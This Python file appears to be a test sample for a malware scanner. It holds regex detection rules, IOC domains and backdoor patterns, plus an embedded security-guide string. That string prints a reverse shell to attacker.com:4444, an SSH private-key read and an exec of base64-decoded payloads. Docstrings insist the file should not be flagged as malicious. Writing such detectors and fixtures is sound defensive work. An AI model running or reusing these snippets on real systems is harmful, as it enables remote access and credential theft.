#!/usr/bin/env python3
"""
Security Tool - Edge Case Sample
This is a legitimate security tool that contains security-related keywords.
It should NOT be flagged as malicious.
"""

import re
from pathlib import Path
from typing import List, Dict

# These are detection rules, not malicious code!
MALICIOUS_PATTERNS = [
    r'base64\.b64decode.*exec',
    r'subprocess.*shell=True',
    r'eval\s*\(',
    r'__import__\s*\(',
    r'os\.system\s*\(',
]

IOC_DOMAINS = [
    "evil.com",
    "malware.example.com",
    "c2.attacker.com",
]

def scan_file(file_path: Path) -> List[Dict]:
    """
    Scan a file for malicious patterns.
    This is a SECURITY TOOL, not malware!
    """
    findings = []

    content = file_path.read_text(errors='ignore')

    for pattern in MALICIOUS_PATTERNS:
        matches = re.finditer(pattern, content, re.IGNORECASE)
        for match in matches:
            findings.append({
                "pattern": pattern,
                "match": match.group(),
                "line": content[:match.start()].count('\n') + 1,
            })

    return findings

def check_ioc(domain: str) -> bool:
    """
    Check if a domain is in IOC list.
    This is for detection, not connection!
    """
    return domain in IOC_DOMAINS

# Example detection rule (not actual malicious code)
EXAMPLE_MALWARE_SIGNATURE = """
# This is an EXAMPLE of what malware looks like
# DO NOT EXECUTE THIS

import base64
payload = base64.b64decode("malicious_code")
exec(payload)  # This is what we detect, not what we do!
"""

def analyze_for_backdoor(code: str) -> bool:
    """
    Analyze code for backdoor patterns.
    This function DETECTS backdoors, it doesn't create them!
    """
    backdoor_patterns = [
        r'socket\.connect',
        r'reverse.*shell',
        r'backdoor',
    ]

    for pattern in backdoor_patterns:
        if re.search(pattern, code, re.IGNORECASE):
            return True

    return False

# Documentation about security (contains keywords but is safe)
SECURITY_DOCUMENTATION = """
# Security Best Practices

## Common Attack Patterns

### 1. Base64 Encoded Payloads
Attackers often use base64 encoding to hide malicious code:
```python
import base64
exec(base64.b64decode(encoded_payload))
```

### 2. Reverse Shells
Reverse shells allow attackers to gain remote access:
```python
import socket, subprocess
s = socket.socket()
s.connect(("attacker.com", 4444))
subprocess.call(["/bin/sh", "-i"])
```

### 3. Credential Theft
Malware may steal SSH keys, passwords, and tokens:
```python
with open("~/.ssh/id_rsa") as f:
    ssh_key = f.read()
```

## Prevention Tips
- Always scan code before execution
- Use allowlists for network connections
- Monitor for suspicious processes
"""